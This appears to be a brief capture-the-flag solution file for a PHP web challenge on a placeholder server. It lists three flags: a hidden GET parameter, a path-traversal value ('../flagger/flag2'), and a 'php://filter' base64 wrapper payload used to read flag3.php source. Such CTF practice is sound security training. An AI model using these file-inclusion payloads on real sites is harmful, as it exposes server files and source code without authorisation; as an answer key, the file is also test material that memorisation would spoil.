@@ -1,0 +1,23 @@
+http://<CHALLENGE_SERVER_IP>:8894
+
+
+Flag 1:
+
+find GET param by link or source code: hidden
+set any value
+
+http://<CHALLENGE_SERVER_IP>:8894/?hidden=randomValue
+
+
+Flag 2:
+find GET param by source code: hidden
+
+http://<CHALLENGE_SERVER_IP>:8894/?hidden=../flagger/flag2
+
+
+Flag 3:
+use php filter
+
+http://<CHALLENGE_SERVER_IP>:8894/?hidden=php://filter/convert.base64-encode/resource=flag3.php
+
+decode base64
